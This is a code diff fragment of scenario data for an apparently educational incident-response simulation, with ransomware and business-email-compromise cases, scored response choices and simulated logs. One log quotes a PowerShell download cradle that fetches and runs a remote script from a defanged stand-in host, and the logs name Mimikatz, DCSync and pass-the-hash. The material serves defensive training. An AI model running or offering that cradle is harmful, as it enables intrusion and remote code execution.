+            quality: 'bad',
+            score: { time: -10, containment: 10, evidence: -20, thoroughness: -5 },
+            outcome: 'The IT team takes 12 minutes to reach the data center. They power off servers instead of just disconnecting — volatile memory evidence is lost. Encryption was stopped but forensic artifacts in RAM are gone.',
+          },
+        ],
+        siemEntries: [
+          { time: '03:42', sev: 'crit', text: 'INCIDENT ASSIGNED — Ransomware — Meridian Financial' },
+          { time: '03:42', sev: 'warn', text: 'SLA CLOCK STARTED — P1 response: 15 min target' },
+          { time: '03:43', sev: 'info', text: 'Pulling EDR telemetry for FS-PROD-01..03' },
+          { time: '03:43', sev: 'crit', text: 'Active encryption detected — files still being modified' },
+        ],
+      },
+      { // CONTAINMENT
+        name: 'CONTAINMENT',
+        narrative: 'Initial triage is complete. You need to contain the threat and prevent further spread. The attacker has a foothold in Active Directory — a service account (svc_backup) was compromised and used for lateral movement. The C2 is beaconing to 185.220.101.34.',
+        evidence: {
+          title: 'LATERAL MOVEMENT ANALYSIS',
+          content: `<span class="log-warn">[02:14:00]</span> Successful auth: svc_backup → DC-PROD-01 (Kerberos)
+<span class="log-warn">[02:15:33]</span> <span class="log-highlight">DCSync</span> detected from svc_backup — NTDS.dit extraction
+<span class="log-warn">[02:18:00]</span> PsExec execution: DC-PROD-01 → FS-PROD-01 (svc_backup)
+<span class="log-warn">[02:19:44]</span> Scheduled task created: "WindowsUpdate" → svchost_update.exe
+<span class="log-warn">[02:22:00]</span> Outbound data: 185.220.101.34 — 2.3 GB transferred
+<span class="log-warn">[02:45:00]</span> <span class="log-highlight">GPO MODIFIED</span> — Default Domain Policy (disable AV)
+<span class="log-warn">[03:01:00]</span> Encryption routine triggered via scheduled task`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Disable svc_backup, block C2 IPs at firewall, reset KRBTGT twice',
+            desc: 'Full containment: kill the compromised account, block exfil, and invalidate Kerberos tickets.',
+            quality: 'good',
+            score: { time: 10, containment: 25, evidence: 10, thoroughness: 15 },
+            outcome: 'Comprehensive containment executed. The attacker\'s access is severed at multiple points. KRBTGT double-reset invalidates any golden tickets. Firewall rules block C2 and exfil IPs. The GPO change is reverted.',
+          },
+          {
+            key: 'B',
+            label: 'Block C2 IPs at firewall and disable the compromised account',
+            desc: 'Standard containment — block network indicators and lock the account.',
+            quality: 'partial',
+            score: { time: 5, containment: 10, evidence: 5, thoroughness: 5 },
+            outcome: 'C2 communications blocked and svc_backup disabled. However, you didn\'t reset KRBTGT — the attacker may have forged golden tickets that remain valid. The modified GPO is still in place, leaving AV disabled across the domain.',
+          },
+          {
+            key: 'C',
+            label: 'Shut down the domain controller to stop the bleeding',
+            desc: 'Power off DC-PROD-01 to prevent any further AD compromise.',
+            quality: 'bad',
+            score: { time: -20, containment: 5, evidence: -15, thoroughness: -10 },
+            outcome: 'Shutting down the DC causes authentication failures across the entire environment. Employees can\'t log in, business operations halt. The backup DC takes over but still has the compromised GPO. Memory forensics on the primary DC are lost.',
+          },
+        ],
+        siemEntries: [
+          { time: '03:55', sev: 'warn', text: 'DCSync activity confirmed — svc_backup extracted NTDS.dit' },
+          { time: '03:56', sev: 'crit', text: 'GPO modification detected — AV disabled domain-wide' },
+          { time: '03:57', sev: 'info', text: '2.3 GB data exfiltrated to 185.220.101.34 before containment' },
+        ],
+      },
+      { // INVESTIGATION
+        name: 'INVESTIGATION',
+        narrative: 'Containment measures are in place. Now you need to determine the full scope: initial access vector, all compromised systems, data exfiltrated, and persistence mechanisms. The client\'s CISO is asking for a preliminary impact assessment.',
+        evidence: {
+          title: 'EMAIL GATEWAY LOGS + ENDPOINT FORENSICS',
+          content: `<span class="log-warn">[Feb 14 09:12]</span> Email received: jsmith@meridian.com
+  From: invoice@docusign-secure.net (spoofed)
+  Attachment: Q4_Invoice_Final.xlsm (macro-enabled)
+<span class="log-warn">[Feb 14 09:14]</span> <span class="log-highlight">Macro executed</span> — PowerShell download cradle
+  powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).
+  DownloadString('hxxps://cdn-update[.]com/stage2.ps1')"
+<span class="log-warn">[Feb 14 09:15]</span> Cobalt Strike beacon established → 185.220.101.34
+<span class="log-warn">[Feb 14 09:22]</span> Credential harvesting: Mimikatz on WS-JSMITH
+<span class="log-warn">[Feb 14 11:00]</span> Privilege escalation: jsmith → svc_backup (pass-the-hash)
+<span class="log-ok">[FORENSIC NOTE]</span> 14 systems show evidence of lateral movement
+<span class="log-ok">[FORENSIC NOTE]</span> Exfil staging directory: C:\\ProgramData\\WindowsUpdate\\`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Full forensic triage: image affected systems, analyze timeline, document IOCs',
+            desc: 'Systematic forensic analysis of all 14 affected systems. Thorough but time-intensive.',
+            quality: 'good',
+            score: { time: -5, containment: 5, evidence: 25, thoroughness: 20 },
+            outcome: 'Comprehensive forensic analysis reveals the complete attack timeline from phishing to encryption (5-day dwell time). You identify all 14 compromised systems, 3 persistence mechanisms (scheduled tasks, WMI subscriptions, registry run keys), and confirm 2.3 GB of financial data was exfiltrated. Findings documented with proper chain of custody.',
+          },
+          {
+            key: 'B',
+            label: 'Focus on IOC sweeps across the environment using EDR',
+            desc: 'Use CrowdStrike to hunt for known IOCs across all endpoints. Fast but may miss novel artifacts.',
+            quality: 'partial',
+            score: { time: 10, containment: 5, evidence: 10, thoroughness: 10 },
+            outcome: 'EDR IOC sweep identifies 11 of 14 compromised systems. You find the primary persistence mechanisms but miss a WMI event subscription that could allow re-entry. The exfiltrated data volume is confirmed but specific files aren\'t catalogued.',
+          },
+          {
+            key: 'C',
+            label: 'Check only the initially reported file servers and call it scoped',
+            desc: 'Limit investigation to the 3 file servers that showed ransom notes. Quick report to client.',
+            quality: 'bad',
+            score: { time: 15, containment: -10, evidence: -15, thoroughness: -20 },
+            outcome: 'You miss 11 compromised workstations, the initial phishing vector, and multiple persistence mechanisms. Your incident report is incomplete. Two weeks later, the attacker uses the WMI persistence to re-enter the environment and deploys ransomware again.',
+          },
+        ],
+        siemEntries: [
+          { time: '04:30', sev: 'info', text: 'Beginning investigation phase — scope analysis' },
+          { time: '04:32', sev: 'warn', text: 'Initial access: phishing email to jsmith — Feb 14' },
+          { time: '04:35', sev: 'crit', text: 'Dwell time confirmed: 5 days before encryption' },
+          { time: '04:38', sev: 'warn', text: 'Data exfiltration: 2.3 GB financial records' },
+        ],
+      },
+      { // ERADICATION
+        name: 'ERADICATION',
+        narrative: 'Investigation is complete. You\'ve mapped the attacker\'s footprint. Now it\'s time to remove all traces of the adversary from the environment — persistence mechanisms, backdoors, compromised credentials, and malicious artifacts.',
+        evidence: {
+          title: 'PERSISTENCE & ARTIFACTS INVENTORY',
+          content: `<span class="log-highlight">PERSISTENCE MECHANISMS FOUND:</span>
+  [1] Scheduled Task: "WindowsUpdate" on 6 hosts → svchost_update.exe
+  [2] WMI Event Subscription: CommandLineEventConsumer on DC-PROD-01
+  [3] Registry Run Key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+      "SecurityUpdate" → C:\\ProgramData\\WindowsUpdate\\beacon.exe
+  [4] Modified GPO: Default Domain Policy — AV exclusions added
+
+<span class="log-highlight">COMPROMISED CREDENTIALS:</span>
+  - jsmith (domain user)
+  - svc_backup (service account — domain admin)
+  - KRBTGT (golden ticket possible)
+  - 3 additional service accounts used for lateral movement
+
+<span class="log-highlight">MALICIOUS ARTIFACTS:</span>
+  - svchost_update.exe (LockBit payload) — 6 hosts
+  - beacon.exe (Cobalt Strike) — 14 hosts
+  - stage2.ps1 (loader) — WS-JSMITH
+  - Exfil staging: C:\\ProgramData\\WindowsUpdate\\ — 8 hosts`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Systematic removal: clear all persistence, reset all compromised creds, rebuild GPO',
+            desc: 'Methodically remove every identified artifact, persistence mechanism, and compromised credential.',
+            quality: 'good',
+            score: { time: 5, containment: 15, evidence: 5, thoroughness: 20 },
+            outcome: 'All 4 persistence mechanisms removed. All compromised passwords reset including KRBTGT (double reset). GPO restored to known-good state. Malicious files quarantined with hashes preserved for evidence. EDR confirms no remaining artifacts.',
+          },
+          {
+            key: 'B',
+            label: 'Remove malware and reset passwords, but skip GPO and WMI cleanup',
+            desc: 'Focus on the obvious threats — malware binaries and compromised accounts.',
+            quality: 'partial',
+            score: { time: 10, containment: 5, evidence: 0, thoroughness: -5 },
+            outcome: 'Malware removed and passwords reset. However, the WMI persistence and GPO modifications remain. AV exclusions in the GPO create a blind spot. The WMI event subscription is a ticking time bomb if the attacker crafted it to trigger on a future event.',
+          },
+          {
+            key: 'C',
+            label: 'Wipe and reimage all affected systems from scratch',
+            desc: 'Nuclear option — flatten everything and rebuild from known-good backups.',
+            quality: 'partial',
+            score: { time: -15, containment: 20, evidence: -10, thoroughness: 10 },
+            outcome: 'All affected systems reimaged from clean media. Extremely thorough from a containment perspective, but you lost additional forensic evidence that legal counsel later needed. The reimaging process takes 3 days and the client loses significant productivity. GPO and AD-level persistence wasn\'t addressed by reimaging endpoints.',
+          },
+        ],
+        siemEntries: [
+          { time: '06:00', sev: 'info', text: 'Eradication phase initiated — removing persistence' },
+          { time: '06:05', sev: 'success', text: 'Scheduled tasks removed from 6 hosts' },
+          { time: '06:12', sev: 'warn', text: 'WMI subscription found on DC — removal requires care' },
+        ],
+      },
+      { // RECOVERY
+        name: 'RECOVERY',
+        narrative: 'Eradication is complete. The client needs to resume business operations. Encrypted file servers need to be restored, and you need to verify the environment is clean before bringing systems back online.',
+        evidence: {
+          title: 'RECOVERY STATUS',
+          content: `<span class="log-ok">BACKUP ASSESSMENT:</span>
+  - Last clean backup: Feb 13 23:00 UTC (before compromise execution)
+  - Backup integrity: VERIFIED (offline/immutable backups)
+  - Backup coverage: FS-PROD-01, 02, 03 — full file-level
+  - DC backup: System state from Feb 13 — clean
+
+<span class="log-warn">BUSINESS IMPACT:</span>
+  - 3 file servers offline — ~200 employees affected
+  - Email system operational (Exchange Online — unaffected)
+  - ERP system operational (SaaS — unaffected)
+  - Client requesting ETA for full restoration
+
+<span class="log-ok">MONITORING:</span>
+  - EDR coverage: 100% of endpoints
+  - Enhanced monitoring rules deployed
+  - Threat hunting queries active`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Staged recovery: restore one server, verify clean, then proceed with others',
+            desc: 'Restore FS-PROD-01 first as a canary. Monitor for 4 hours. Then restore remaining servers.',
+            quality: 'good',
+            score: { time: 5, containment: 10, evidence: 5, thoroughness: 15 },
+            outcome: 'FS-PROD-01 restored from clean backup and monitored for 4 hours — no suspicious activity. Remaining servers restored in parallel. Enhanced EDR monitoring confirms clean environment. Full operations restored within 8 hours with confidence.',
+          },
+          {
+            key: 'B',
+            label: 'Restore all servers simultaneously from backup',
+            desc: 'Parallel restore of all 3 file servers. Fastest path to business resumption.',
+            quality: 'partial',
+            score: { time: 15, containment: 0, evidence: 0, thoroughness: -5 },
+            outcome: 'All servers restored in parallel. Operations resume quickly, client is happy with the speed. However, you didn\'t verify the backup was truly clean before mass deployment — fortunately it was, but this approach carried unnecessary risk.',
+          },
+          {
+            key: 'C',
+            label: 'Pay the ransom to get the decryption keys, then restore',
+            desc: 'The client\'s CFO is pressuring to pay. Use the decryptor and skip the backup restore.',
+            quality: 'bad',
+            score: { time: -5, containment: -15, evidence: -10, thoroughness: -20 },
+            outcome: 'Against best practices, the client pays $450,000 in Bitcoin. The decryptor works on only 60% of files — the rest are corrupted. You still need to restore from backup anyway. The payment funds further criminal operations and paints the client as a willing payer for future attacks. Cyber insurance may not cover the ransom.',
+          },
+        ],
+        siemEntries: [
+          { time: '10:00', sev: 'info', text: 'Recovery phase — backup verification in progress' },
+          { time: '10:15', sev: 'success', text: 'Backup integrity verified — clean pre-compromise snapshot' },
+          { time: '10:20', sev: 'info', text: 'Client CISO requesting restoration timeline' },
+        ],
+      },
+      { // POST-INCIDENT
+        name: 'POST-INCIDENT',
+        narrative: 'Systems are restored and the immediate crisis is over. Now comes the critical final phase: documentation, lessons learned, and hardening recommendations. The client\'s CISO has scheduled a post-incident review meeting. Your report will influence their security roadmap.',
+        evidence: {
+          title: 'INCIDENT SUMMARY DRAFT',
+          content: `<span class="log-ok">INCIDENT TIMELINE:</span>
+  Initial access:    Feb 14 09:12 (phishing)
+  Privilege escalation: Feb 14 11:00
+  Lateral movement:  Feb 14-18 (5 days)
+  Data exfiltration:  Feb 18 02:22 (2.3 GB)
+  Encryption:        Feb 19 03:01
+  Detection:         Feb 19 03:01 (47 min to escalation)
+  Containment:       Feb 19 ~03:50
+  Recovery complete: Feb 19 ~18:00
+
+<span class="log-warn">KEY FINDINGS:</span>
+  - Phishing email bypassed email gateway (no macro blocking)
+  - No MFA on service accounts
+  - Excessive privileges: svc_backup had domain admin
+  - EDR alerting was functional but SOC response was delayed
+  - Immutable backups saved the recovery`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Full post-incident report with root cause analysis, timeline, and hardening plan',
+            desc: 'Comprehensive report: executive summary, technical timeline, IOCs, MITRE mapping, 12 prioritized recommendations.',
+            quality: 'good',
+            score: { time: 5, containment: 5, evidence: 10, thoroughness: 25 },
+            outcome: 'Your detailed report becomes a blueprint for security improvements. The client implements MFA on all service accounts, deploys macro blocking, reduces svc_backup privileges, and establishes a 24/7 SOC monitoring contract. They\'re better prepared for next time.',
+          },
+          {
+            key: 'B',
+            label: 'Standard incident report with timeline and basic recommendations',
+            desc: 'Cover the essentials: what happened, when, and a few recommendations.',
+            quality: 'partial',
+            score: { time: 10, containment: 0, evidence: 5, thoroughness: 5 },
+            outcome: 'The report covers the incident adequately but doesn\'t dive into root causes or provide a prioritized hardening roadmap. The client fixes the most obvious issues (macro blocking) but doesn\'t address the service account privilege problem.',
+          },
+          {
+            key: 'C',
+            label: 'Close the ticket — the systems are back up, job done',
+            desc: 'Mark the incident as resolved. The client can figure out improvements on their own.',
+            quality: 'bad',
+            score: { time: 15, containment: -5, evidence: -10, thoroughness: -25 },
+            outcome: 'No formal report, no lessons learned, no recommendations. The client doesn\'t address root causes. Six months later, a similar phishing attack succeeds again because nothing changed. Your MSSP\'s reputation takes a hit.',
+          },
+        ],
+        siemEntries: [
+          { time: '18:30', sev: 'success', text: 'All systems restored — business operations resumed' },
+          { time: '18:35', sev: 'info', text: 'Post-incident review scheduled — documentation required' },
+          { time: '18:40', sev: 'info', text: 'Client CISO requesting formal incident report' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'BEC',
+    title: 'Business Email Compromise — CEO Fraud',
+    client: 'Ashford Manufacturing',
+    severity: 'HIGH',
+    sevClass: 'high',
+    ticketId: 'IR-2024-0913',
+    assignedTime: '14:22 UTC',
+    summary: 'CFO received urgent wire transfer request appearing to come from CEO. $340,000 wire initiated to unknown offshore account. Email authentication investigation needed.',
+    iocs: [
+      { type: 'EMAIL', val: 'ceo@ashford-mfg.com (spoofed — reply-to: ceo@ashf0rd-mfg.com)' },
+      { type: 'DOMAIN', val: 'ashf0rd-mfg.com — typosquat registered 3 days ago' },
+      { type: 'IP', val: '103.145.22.87 — email origin (VPN exit node, SEA)' },
+      { type: 'EMAIL RULE', val: 'Inbox rule "Administrative" — auto-forward + delete' },
+      { type: 'ACCOUNT', val: 'CEO M365 account — suspicious sign-in from unfamiliar location' },
+    ],
+    phases: [
+      { // TRIAGE
+        name: 'TRIAGE',
+        narrative: 'The client\'s CFO, Janet Morris, just contacted your MSSP in a panic. She approved a $340,000 wire transfer 2 hours ago based on an "urgent" email from the CEO requesting payment to a new vendor. The CEO is on vacation and says he never sent it. The wire may still be reversible if you act fast.',
+        evidence: {
+          title: 'SUSPICIOUS EMAIL — HEADERS EXTRACT',
+          content: `<span class="log-warn">From:</span> David Chen &lt;ceo@ashford-mfg.com&gt;
+<span class="log-warn">Reply-To:</span> <span class="log-highlight">ceo@ashf0rd-mfg.com</span> (note: zero instead of 'o')
+<span class="log-warn">Subject:</span> URGENT — Wire Transfer Needed Today
+<span class="log-warn">Date:</span> Thu, 19 Feb 2024 11:48:00 +0000
+<span class="log-warn">X-Originating-IP:</span> 103.145.22.87
+
+<span class="log-ok">── EMAIL BODY ──</span>
+Janet,
+I need you to process a wire transfer of $340,000 to the account
+below ASAP. This is for a time-sensitive acquisition deal. Please
+handle this personally and keep it confidential until I announce.
+I'm in meetings all day — email only please.
+
+Account: First National Bank of Cayman
+Routing: 067014822
+Account: 2847193650
+Ref: ASHFORD-ACQ-2024
+
+Thanks,
+David
+
+<span class="log-warn">── AUTHENTICATION ──</span>
+SPF:  <span class="log-highlight">FAIL</span> (ashford-mfg.com does not authorize 103.145.22.87)
+DKIM: <span class="log-highlight">NONE</span> (no DKIM signature)
+DMARC: <span class="log-warn">p=none</span> (policy: report only, no enforcement)`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Call the bank immediately to freeze/reverse the wire, then investigate',
+            desc: 'Priority one: stop the money. Contact CFO to initiate wire recall with their bank.',
+            quality: 'good',
+            score: { time: 20, containment: 25, evidence: 5, thoroughness: 10 },
+            outcome: 'You immediately instruct Janet to call the bank\'s wire fraud department. Because it\'s within the 24-hour recall window, the bank initiates a SWIFT recall. $285,000 of the $340,000 is frozen before it leaves the correspondent bank. Quick action saved the majority of the funds.',
+          },
+          {
+            key: 'B',
+            label: 'Investigate the email headers and CEO\'s account first',
+            desc: 'Understand the attack before acting. Check if the CEO\'s account is compromised.',
+            quality: 'partial',
+            score: { time: -10, containment: -15, evidence: 15, thoroughness: 10 },
+            outcome: 'Your investigation reveals the email was spoofed (not from a compromised CEO account) and identifies the typosquat domain. However, you spent 45 minutes before advising the bank recall. By then, $200,000 has already been forwarded through intermediary accounts and is unrecoverable.',
+          },
+          {
+            key: 'C',
+            label: 'Reply to the CEO to verify if he sent the email',
+            desc: 'Send the CEO an email asking if this wire request is legitimate.',
+            quality: 'bad',
+            score: { time: -20, containment: -20, evidence: -5, thoroughness: -10 },
+            outcome: 'The CEO is on vacation with limited connectivity. He doesn\'t respond for 3 hours. Meanwhile, the wire clears through intermediary banks and the money is gone. Additionally, replying to the spoofed address tips off the attacker that you\'re investigating.',
+          },
+        ],
+        siemEntries: [
+          { time: '14:22', sev: 'crit', text: 'INCIDENT ASSIGNED — BEC / CEO Fraud — Ashford Mfg' },
+          { time: '14:22', sev: 'warn', text: 'Wire transfer: $340,000 initiated 2 hours ago' },
+          { time: '14:23', sev: 'info', text: 'Pulling M365 audit logs and email headers' },
+          { time: '14:24', sev: 'warn', text: 'DMARC policy set to p=none — no email enforcement' },
+        ],
+      },
+      { // CONTAINMENT
+        name: 'CONTAINMENT',
+        narrative: 'The wire recall is in progress. Now you need to determine if the CEO\'s M365 account was actually compromised (vs. simple email spoofing) and contain any unauthorized access. Audit logs show a suspicious sign-in to the CEO\'s account from an unusual location.',
+        evidence: {
+          title: 'M365 AUDIT LOG — CEO ACCOUNT',
+          content: `<span class="log-warn">[Feb 17 02:14]</span> Sign-in: ceo@ashford-mfg.com
+  Location: Lagos, Nigeria (IP: 41.190.2.44)
+  Status: <span class="log-highlight">SUCCESS</span>
+  MFA: <span class="log-highlight">NOT CONFIGURED</span>
+  Client: Browser (Chrome 121 / Windows)
+<span class="log-warn">[Feb 17 02:16]</span> Inbox Rule Created: "Administrative"
+  Condition: Subject contains "wire" OR "transfer" OR "payment"
+  Action: Move to RSS Feeds, Mark as Read
+<span class="log-warn">[Feb 17 02:18]</span> Mail forwarding: ceo@ashf0rd-mfg.com added
+<span class="log-warn">[Feb 17 03:00]</span> 847 emails accessed in CEO mailbox
+<span class="log-warn">[Feb 18 11:48]</span> Spoofed email sent externally (from different infra)
+<span class="log-ok">[Feb 19 14:22]</span> Incident reported to MSSP`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Reset CEO password, revoke sessions, remove inbox rules, block typosquat domain',
+            desc: 'Full account containment: lock out the attacker, clean up persistence, and block the lookalike domain.',
+            quality: 'good',
+            score: { time: 10, containment: 25, evidence: 10, thoroughness: 15 },
+            outcome: 'CEO\'s password reset and all active sessions revoked. The malicious inbox rule and mail forwarding to the typosquat domain removed. IT blocks ashf0rd-mfg.com at the email gateway and web proxy. The attacker is fully locked out.',
+          },
+          {
+            key: 'B',
+            label: 'Reset the CEO\'s password and enable MFA',
+            desc: 'Secure the account with new credentials and add multi-factor authentication.',
+            quality: 'partial',
+            score: { time: 10, containment: 10, evidence: 0, thoroughness: 0 },
+            outcome: 'Password reset and MFA enabled — good. But you forgot to revoke existing sessions (the attacker\'s token is still valid for up to an hour) and didn\'t remove the inbox rule that\'s silently forwarding emails to the typosquat domain. The attacker continues receiving forwarded emails for 47 more minutes.',
+          },
+          {
+            key: 'C',
+            label: 'Disable the CEO\'s entire M365 account',
+            desc: 'Completely disable the account to prevent any access.',
+            quality: 'bad',
+            score: { time: 5, containment: 15, evidence: -10, thoroughness: -5 },
+            outcome: 'Account disabled — attacker is locked out, but so is the CEO. He\'s on vacation and now can\'t access email, Teams, or OneDrive. Important business communications are disrupted. The inbox rule and forwarding are still configured and will reactivate when the account is re-enabled.',
+          },
+        ],
+        siemEntries: [
+          { time: '14:40', sev: 'crit', text: 'CEO account compromised — sign-in from Lagos, Nigeria' },
+          { time: '14:41', sev: 'warn', text: 'Malicious inbox rule found — forwarding wire/payment emails' },
+          { time: '14:42', sev: 'warn', text: 'No MFA configured on executive accounts' },
+        ],
+      },
+      { // INVESTIGATION
+        name: 'INVESTIGATION',
+        narrative: 'The CEO\'s account is secured. You need to determine the full scope: how the credentials were obtained, whether other accounts are compromised, and what data the attacker accessed in the 2 days they had access to the CEO\'s mailbox.',
+        evidence: {
+          title: 'CREDENTIAL THEFT ANALYSIS',
+          content: `<span class="log-ok">── PHISHING CAMPAIGN DETECTED ──</span>
+<span class="log-warn">[Feb 15 08:33]</span> Email to ceo@ashford-mfg.com
+  From: IT-Support@microsoft-365-admin.com
+  Subject: "Action Required: Password Expiry Notice"
+  Link: hxxps://microsoft-365-admin[.]com/login
+  <span class="log-highlight">CEO clicked link and entered credentials</span>
+
+<span class="log-ok">── SCOPE ANALYSIS ──</span>
+  Same phishing campaign sent to: 12 employees
+  Clicked link: 4 employees
+  Entered credentials: 2 (CEO + VP Sales)
+  VP Sales account: <span class="log-highlight">Also compromised</span>
+    Sign-in from 41.190.2.44 on Feb 17 02:30
+    No inbox rules created (yet)
+
+<span class="log-ok">── CEO MAILBOX ACCESS ──</span>
+  Attacker accessed: 847 emails over 2 days
+  Categories: Financial reports, board minutes, M&A discussions
+  <span class="log-highlight">Sensitive data exposed: Q4 financials, acquisition target list</span>`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Secure VP Sales account, audit all 12 targeted users, assess data exposure',
+            desc: 'Reset all potentially compromised accounts, check for additional inbox rules, catalogue exposed data.',
+            quality: 'good',
+            score: { time: 5, containment: 15, evidence: 20, thoroughness: 20 },
+            outcome: 'VP Sales account secured (password reset, MFA, session revocation). All 12 phishing targets audited — no additional compromises beyond the two identified. Data exposure assessment documents all 847 accessed emails, including 3 board presentations and the M&A target list. Legal counsel notified about potential material non-public information exposure.',
+          },
+          {
+            key: 'B',
+            label: 'Secure the VP Sales account and move on to eradication',
+            desc: 'Fix the second compromised account. Don\'t audit the other 10 phishing targets.',
+            quality: 'partial',
+            score: { time: 10, containment: 5, evidence: 5, thoroughness: -5 },
+            outcome: 'VP Sales account secured. But you didn\'t audit the other 10 employees who received the phishing email — you\'re assuming only those who clicked were at risk. You also didn\'t assess the full scope of data exposed from the CEO\'s mailbox, leaving legal counsel without the information they need for regulatory notifications.',
+          },
+          {
+            key: 'C',
+            label: 'Focus only on the wire fraud — the email compromise is a separate ticket',
+            desc: 'The wire fraud is the incident. Account compromise is a security hygiene issue for later.',
+            quality: 'bad',
+            score: { time: 15, containment: -10, evidence: -15, thoroughness: -20 },
+            outcome: 'By treating this as two separate issues, you miss the connection between the credential phishing and the BEC. The VP Sales account remains compromised for another week before anyone notices. The attacker uses it to send fraudulent invoices to 3 of Ashford\'s vendors, resulting in an additional $87,000 in losses.',
+          },
+        ],
+        siemEntries: [
+          { time: '15:10', sev: 'warn', text: 'Credential phishing campaign identified — 12 targets' },
+          { time: '15:12', sev: 'crit', text: 'Second compromised account found: VP Sales' },
+          { time: '15:15', sev: 'warn', text: 'CEO mailbox: 847 emails accessed incl. M&A data' },
+        ],
+      },
+      { // ERADICATION
+        name: 'ERADICATION',
+        narrative: 'You\'ve mapped the full attack. Now remove all attacker access and infrastructure. The typosquat domain is still active and could be used against other targets.',
+        evidence: {
+          title: 'ATTACKER INFRASTRUCTURE',
+          content: `<span class="log-highlight">DOMAINS:</span>
+  ashf0rd-mfg.com — registered Feb 16 via Namecheap
+  microsoft-365-admin.com — credential phishing site
+
+<span class="log-highlight">INBOX RULES / FORWARDING:</span>
+  CEO: Rule "Administrative" + forward to ashf0rd-mfg.com
+  VP Sales: No rules created (attacker may not have set up yet)
+
+<span class="log-highlight">EMAIL CONFIGURATION GAPS:</span>
+  DMARC: p=none (no enforcement)
+  DKIM: Not configured
+  SPF: Record exists but too permissive (~all instead of -all)
+  No external email banner/warning configured
+  No MFA on any executive accounts`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Remove all rules, report typosquat domain, fix email auth (DMARC/DKIM/SPF)',
+            desc: 'Clean up all attacker persistence AND fix the underlying email security gaps that allowed this.',
+            quality: 'good',
+            score: { time: 5, containment: 15, evidence: 5, thoroughness: 20 },
+            outcome: 'All malicious inbox rules and forwarding removed. Abuse report filed with Namecheap for ashf0rd-mfg.com — domain suspended within 4 hours. DMARC upgraded to p=reject, DKIM configured, SPF hardened to -all. External email warning banner deployed. MFA enforced for all users.',
+          },
+          {
+            key: 'B',
+            label: 'Remove inbox rules and forwarding, enable MFA across the org',
+            desc: 'Clean up the immediate persistence and add MFA. Leave email auth for later.',
+            quality: 'partial',
+            score: { time: 10, containment: 5, evidence: 0, thoroughness: 5 },
+            outcome: 'Rules removed and MFA deployed — good immediate actions. But DMARC remains at p=none, meaning the attacker (or anyone else) can still spoof ashford-mfg.com emails. The typosquat domain stays active. A competitor later uses the same technique.',
+          },
+          {
+            key: 'C',
+            label: 'Just remove the inbox rules — the rest is a security project, not incident response',
+            desc: 'Minimal cleanup. Email auth improvements are out of scope for this IR engagement.',
+            quality: 'bad',
+            score: { time: 15, containment: -5, evidence: 0, thoroughness: -15 },
+            outcome: 'Rules removed but nothing else changes. The typosquat domain remains active. Three weeks later, the same attacker uses it to target Ashford\'s AP department with fake vendor invoices. DMARC still allows spoofing. The client questions why their MSSP didn\'t flag these gaps.',
+          },
+        ],
+        siemEntries: [
+          { time: '16:00', sev: 'info', text: 'Eradication: removing attacker persistence from M365' },
+          { time: '16:05', sev: 'success', text: 'Malicious inbox rules removed from CEO account' },
+          { time: '16:10', sev: 'warn', text: 'Typosquat domain ashf0rd-mfg.com still active' },
+        ],
+      },
+      { // RECOVERY
+        name: 'RECOVERY',
+        narrative: 'Attacker access is removed. The CEO and VP Sales accounts are secured. Now you need to ensure the organization recovers safely and the wire fraud is properly handled through financial and legal channels.',
+        evidence: {
+          title: 'RECOVERY STATUS',
+          content: `<span class="log-ok">ACCOUNT STATUS:</span>
+  CEO: Password reset, MFA enabled, sessions revoked ✓
+  VP Sales: Password reset, MFA enabled, sessions revoked ✓
+  All users: MFA rollout in progress (ETA: 48 hours)
+
+<span class="log-warn">FINANCIAL STATUS:</span>
+  Wire amount: $340,000
+  Recalled/frozen: Amount depends on triage speed
+  Unrecoverable: Remainder transferred to offshore accounts
+
+<span class="log-warn">LEGAL / REGULATORY:</span>
+  - IC3 complaint not yet filed
+  - Cyber insurance carrier not yet notified
+  - Potential SEC implications (M&A data exposed)
+  - State breach notification requirements unclear`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'File IC3, notify insurance, engage legal for SEC/breach notification assessment',
+            desc: 'Full recovery protocol: law enforcement report, insurance claim, legal review of notification obligations.',
+            quality: 'good',
+            score: { time: 5, containment: 5, evidence: 10, thoroughness: 20 },
+            outcome: 'IC3 complaint filed with all IOCs — FBI opens a case and links it to a known West African BEC ring. Cyber insurance carrier notified within policy window — claim is accepted. Legal counsel determines SEC notification required due to M&A data exposure and drafts the filing. State breach notification letters prepared for affected individuals.',
+          },
+          {
+            key: 'B',
+            label: 'File IC3 report and notify cyber insurance',
+            desc: 'Handle the financial recovery channels. Let the client handle legal.',
+            quality: 'partial',
+            score: { time: 10, containment: 0, evidence: 5, thoroughness: 5 },
+            outcome: 'IC3 filed and insurance notified — good. But without prompting legal review, the client misses the 4-day SEC filing window for material cyber incidents. The SEC later questions the delayed disclosure, adding regulatory risk on top of the financial loss.',
+          },
+          {
+            key: 'C',
+            label: 'The bank is handling the wire recall — recovery is their problem now',
+            desc: 'The technical incident is resolved. Financial recovery is a banking matter.',
+            quality: 'bad',
+            score: { time: 15, containment: -10, evidence: -5, thoroughness: -20 },
+            outcome: 'No IC3 report means law enforcement can\'t track the funds or link to known threat actors. Insurance claim filed late — carrier disputes coverage. No legal review means SEC notification obligations are missed entirely. The client\'s board is furious when they learn about the regulatory exposure months later.',
+          },
+        ],
+        siemEntries: [
+          { time: '17:00', sev: 'info', text: 'Recovery phase — financial and legal workstreams' },
+          { time: '17:05', sev: 'warn', text: 'Wire recall status: pending with correspondent bank' },
+          { time: '17:10', sev: 'info', text: 'Cyber insurance notification window: 72 hours' },
+        ],
+      },
+      { // POST-INCIDENT
+        name: 'POST-INCIDENT',
+        narrative: 'The incident is contained and recovery is underway. Time to document everything and ensure this doesn\'t happen again. The client\'s board wants to understand how this happened and what changes are needed.',
+        evidence: {
+          title: 'INCIDENT METRICS',
+          content: `<span class="log-ok">TIMELINE:</span>
